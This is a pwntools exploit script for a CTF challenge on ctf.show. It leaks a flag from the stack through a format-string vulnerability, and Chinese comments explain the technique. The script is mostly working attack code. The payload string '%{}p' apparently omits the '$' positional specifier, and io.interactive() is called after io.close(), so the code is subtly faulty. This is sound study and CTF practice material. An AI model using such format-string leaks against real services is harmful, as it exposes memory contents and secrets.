from pwn import *
from LibcSearcher import *

#context(arch = "amd64",os = 'linux',log_level = 'debug')
context(arch = "i386", os = 'linux', log_level = 'debug')

#io = process("./pwn")
io = remote('pwn.challenge.ctf.show', 28301)
elf = ELF("./pwn")

# 初始化flag变量
flag = b''

# 循环读取12个格式化字符串的结果
for i in range(6, 6+12):
    # 构造格式化字符串，读取第i个参数
    payload = '%{}p'.format(str(i))
    # 等待提示后发送payload
    io.sendlineafter(b'$ ', payload)
    # 接收返回结果，去除'0x'前缀并转换为bytes
    aim = unhex(io.recvuntil(b'\n', drop=True).replace(b'0x', b''))
    # 将结果反转并添加到flag中
    flag += aim[::-1]

# 打印flag
print(flag)

io.close()
io.interactive()

"""
【知识点讲解】
1. 题目类型：fmtstr - 格式化字符串漏洞信息泄露
2. 核心原理：
   - 利用格式化字符串漏洞读取栈上的数据
   - 通过循环读取多个参数的值，拼接得到flag
3. 关键步骤：
   - 构造格式化字符串 `%{}p` 读取第i个参数
   - 接收返回的十六进制数据
   - 去除'0x'前缀并转换为bytes
   - 将每个字节反转后拼接（因为是小端序）
4. 执行流程：
   - 循环12次，读取第6到第17个参数
   - 每次读取后处理数据并拼接到flag
   - 最后打印完整的flag
5. 格式化字符串漏洞利用技巧：
   - %p：以十六进制形式读取栈上的数据
   - 通过调整参数索引，读取不同位置的数据
   - 小端序处理：数据需要反转才能得到正确的顺序
"""
